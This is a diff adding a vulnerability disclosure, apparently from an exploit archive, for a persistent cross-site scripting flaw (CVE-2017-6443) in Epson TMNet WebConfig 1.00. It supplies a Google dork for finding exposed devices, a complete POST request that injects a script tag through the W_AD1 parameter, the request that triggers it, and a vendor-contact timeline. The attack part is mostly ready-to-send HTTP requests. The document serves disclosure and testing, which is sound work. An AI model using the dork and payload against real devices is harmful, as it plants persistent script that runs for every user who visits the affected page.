@@ -1,0 +1,57 @@
+# Exploit Title: Persistent XSS in EPSON TMNet WebConfig Ver. 1.00
+# Google Dork: intitle:"EPSON TMNet WebConfig Ver.1.00"
+# Date: 3/3/2017
+# Exploit Author: Michael Benich
+# Vendor Homepage: https://www.epson-biz.com/
+# Software Link: https://c4b.epson-biz.com/modules/community/index.php?content_id=50
+# Version: 1.00
+# CVE: CVE-2017-6443
+# Contact: benichmt1@protonmail.com // @benichmt1
+#####################################################################################
+
+Summary:
+Persistent cross-site scripting (XSS) in the web interface of Epson's TMNet WebConfig Ver 1.00 application allows a remote attacker to introduce arbitary Javascript via manipulation of an unsanitized POST parameter.
+
+Steps to reproduce:
+
+1)Make a POST request using Burp Proxy or other application 
+
+------------------------------------------------------------------------------------------
+POST /Forms/oadmin_1 HTTP/1.1
+Host: XXX.XXX.XXX.XXX
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://XXX.XXX.XXX.XXX/oadmin.htm
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 47
+
+W_AD1=<script>window.alert(0)</script>&W_Link1=&Submit=SUBMIT
+
+------------------------------------------------------------------------------------------
+2) Browsing to the main page will execute your script. This remains persistent for any user who then visits this page.
+
+GET /istatus.htm HTTP/1.1
+Host: XXX.XXX.XXX.XXX
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://XXX.XXX.XXX.XXX/side.htm
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+------------------------------------------------------------------------------------------
+
+Timeline:
+
+------------------------------------------------------------------------------------------
+12/1/2016 - Discovery.
+12/9/2016 - Emailed support@ , info@ , and domain-admin@ emails. No response.
+12/16/2016 - Pinged on Twitter. Recommended to contact through support.
+12/22/2016 - Reached on LinkedIn directly to individual listed as Security Engineer and asked to find proper security contact channel. No response, but the connection request was accepted.
+3/3/2017 - Disclosure
+------------------------------------------------------------------------------------------
